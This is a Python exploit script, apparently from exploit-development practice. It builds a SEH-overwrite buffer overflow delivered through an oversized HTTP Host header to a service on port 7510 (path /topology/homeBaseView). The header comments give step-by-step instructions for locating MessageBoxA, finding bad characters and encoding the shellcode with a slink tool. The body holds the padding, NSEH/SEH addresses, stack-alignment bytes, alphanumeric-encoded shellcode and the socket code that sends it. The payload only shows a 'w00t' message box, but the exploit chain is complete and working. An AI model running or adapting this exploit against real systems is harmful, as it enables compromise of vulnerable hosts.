#!/usr/bin/python
import socket
import os
import sys

#*************************************************************************************************************
#1. Use arwin to locate memory address of MessageBoxA function in memory                                     *
#  >arwin user32 MessageBoxA                                                                                 *
#2. Replace it in the MessageBoxA shellcode below (\xea\x07\x45\x7e)                                         *
#3. Choose a message and replace it in the MessageBoxA shellcode below (\x77\x30\x30\x74)                    *
#4. Identify badChars and update slinkModified.py script                                                     *
#  $sed -r 'H;$!d;x;s:\n::g;:l;s:(\\x..)(.*)\1:\2:;tl' allhex.txt allowed.txt > missingChars.txt             *
#5. Update slinkModified script with bad chars and encode MessageBoxA with updated shellcode                 *
#  $cat slinkOutput.txt | awk '{print $3}' | grep -v "\[" | grep -v "bad" | sed "s/\"//g" | sed "s/\\\x/ /g" *  // Use this command to convert slink calculations output into a form that you can binary-paste into Immunity
#  $cat slinkOutput.txt | awk '{print $3}' | grep -v "\[" | grep -v "bad" | sed "s/\"//g" | tr -d "\n\r"     *  // Use this command to convert slink calculations output into a form that can be used in python script
#6. Replace below mbox_encoder shellcode with the shellcode from step 5                                      * 
#*************************************************************************************************************

### MessageBoxA shellcode: "\x31\xc0\x50\xbb\x77\x30\x30\x74\x53\x89\xe6\x31\xc0\x50\x56\x56\x50\xb8\xea\x07\x45\x7e\xff\xd0" 

#0x6D331228 - SEH: Alphanumeric compliant PPR address
#0x4C4C7721 - NSEH: Conditional Jump over SEH return address
#25\x55\x4E\x4D\x4A\x25\x2A\x31\x32\x35\x54\x58\x2D\x66\x4D\x55\x55\x2D\x66\x4B\x55\x55\x2D\x6A\x50\x55\x55\x50\x5C - Get position in stack
#0x7e4507ea - WinXP SP3 MessageBoxA Address
#0x77303074 - w00t, message box window message and title


ip = "0.0.0.0" #Change this
#mBoxAddress = "\xea\x07\x45\x7e"
#message = "\x77\x30\x30\x74"

stack_alignment = ("\x25\x55\x4E\x4D\x4A\x25\x2A\x31\x32\x35\x54\x58\x2D\x66\x4D\x55\x55\x2D\x66\x4B\x55\x55\x2D\x6A\x50\x55\x55\x50\x5C")
mbox_encoder = ("\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x61\x41\x41\x41\x05\x61\x41\x41\x41\x05\x41\x41\x41\x41\x2D\x33\x33\x33\x33\x50\x41\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x64\x26\x44\x77\x05\x64\x25\x33\x66\x05\x43\x23\x33\x55\x2D\x33\x33\x33\x33\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x33\x31\x64\x66\x05\x33\x31\x54\x65\x05\x23\x21\x33\x46\x2D\x33\x33\x33\x33\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x21\x61\x31\x33\x05\x22\x51\x31\x33\x05\x21\x41\x21\x23\x2D\x33\x33\x33\x33\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x33\x32\x44\x63\x05\x32\x32\x44\x53\x05\x32\x22\x34\x63\x2D\x33\x33\x33\x33\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x05\x66\x41\x44\x36\x05\x55\x31\x33\x35\x05\x33\x31\x33\x36\x2D\x33\x33\x33\x33\x50")
nseh = "\x4C\x4C\x77\x21"
seh = "\x28\x12\x33\x6D"

crash = "A"*3377 + nseh + seh + "C" * 29
crash+=  stack_alignment + mbox_encoder + "A" * (360-len(stack_alignment + mbox_encoder)) + ":7510"

buffer="GET /topology/homeBaseView HTTP/1.1\r\n"
buffer+="Host: " + crash + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
buffer+="Content-Length: 1048580\r\n\r\n"
buffer+="\xcc" * 1500
print "[*] Sending evil HTTP request..."
expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect((ip, 7510))
expl.send(buffer)
expl.close()
